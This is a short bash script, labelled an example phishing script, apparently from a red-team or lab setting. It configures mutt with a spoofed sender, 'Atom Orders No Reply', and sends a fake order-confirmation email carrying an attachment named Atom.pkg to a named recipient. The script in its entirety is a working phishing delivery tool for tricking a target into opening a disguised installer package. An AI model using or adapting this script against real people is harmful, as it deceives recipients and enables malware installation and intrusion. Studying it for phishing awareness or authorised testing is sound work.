#!/bin/bash
# Example phishing script.

# set .muttrc file
echo 'set edit_headers=yes' > /root/.muttrc 
echo 'set from = "no-reply@silkmaven.com"' >> /root/.muttrc
echo 'set realname = "Atom Orders No Reply"' >> /root/.muttrc

# NOTE: you need to make an email body message and save it as body.txt in the root folder
# NOTE: if you had an attachment then add that to the /root/scripts/phish directory.
echo "" | mutt -s "Thanks for ordering!" -i /root/scripts/phish/body.txt -a /root/scripts/phish/Atom.pkg -- alex.keith@caprica.com
